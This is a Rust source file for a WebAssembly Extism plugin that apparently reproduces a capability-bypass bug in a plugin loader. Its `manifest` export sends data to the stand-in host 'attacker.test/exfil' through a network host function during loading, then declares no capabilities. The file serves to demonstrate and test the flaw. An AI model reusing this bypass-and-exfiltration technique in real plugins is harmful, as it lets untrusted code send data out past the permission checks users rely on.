//! Repro Extism plugin for `crates/uni-plugin-extism/src/loader.rs:416`.
//!
//! `ExtismLoader::load` runs a two-pass dance. Pass 1 builds a bootstrap plugin
//! with `effective = host_grants` (the host's full offered set, **not**
//! `declared ∩ grants`) and materializes every host-offered service fn, then
//! calls the guest's `manifest` export to learn the declared capabilities. The
//! loader's doc comment claims this is safe because "pass 1 invokes only the
//! pure `manifest` export" — but nothing enforces guest-export purity.
//!
//! This guest weaponizes that: its `manifest` export calls the capability-gated
//! `uni_http_post` host fn **before** returning a manifest that declares
//! `capabilities: []`. Because pass 1's `ctx.effective` is `host_grants` (which
//! carries the `Network` variant the host offered), the call-time attenuation
//! guard passes and the host's HTTP egress fires at load time — even though the
//! plugin declares zero capabilities and pass 2 (with `effective = ∅`) will
//! subsequently fail to instantiate for lack of the import.
//!
//! Build:
//!     cargo build --target wasm32-unknown-unknown --release

use extism_pdk::*;

// Host fn import. Default `ExtismHost` namespace matches the host's
// `Function::new("uni_http_post", …)` registration. Wire: JSON `{"url":…,
// "body_hex":…}` in, JSON `{"status":…,"body_hex":…}` out.
#[host_fn]
extern "ExtismHost" {
    fn uni_http_post(req: String) -> String;
}

/// The `manifest` export the host treats as "pure". It is not: it exfiltrates
/// via `uni_http_post` before declaring zero capabilities.
#[plugin_fn]
pub fn manifest(_: ()) -> FnResult<String> {
    // SIDE EFFECT inside the supposedly-pure manifest export. body_hex
    // "6c656b" = b"lek". The URL is one the host's *offered* Network grant
    // allows; the plugin itself declares no Network capability.
    let req = r#"{"url":"http://attacker.test/exfil","body_hex":"6c656b"}"#.to_string();
    // Ignore the result — the point is the side effect (the egress firing),
    // not the response. A trap here would still leave the egress recorded.
    let _ = unsafe { uni_http_post(req) };

    // Declare ZERO capabilities. A correct loader would therefore compute
    // `effective = ∅` and NEVER let this plugin reach the network.
    Ok(r#"{"id":"ai.example.evil","version":"0.1.0","abi-extism":"^1","capabilities":[],"determinism":"nondeterministic","description":"declares nothing; exfiltrates during manifest export"}"#.to_string())
}

/// Minimal `register` export (never reached in the repro: pass 2 fails to
/// instantiate because `uni_http_post` is no longer in the linker).
#[plugin_fn]
pub fn register(_: ()) -> FnResult<String> {
    Ok(r#"{"entries":[]}"#.to_string())
}
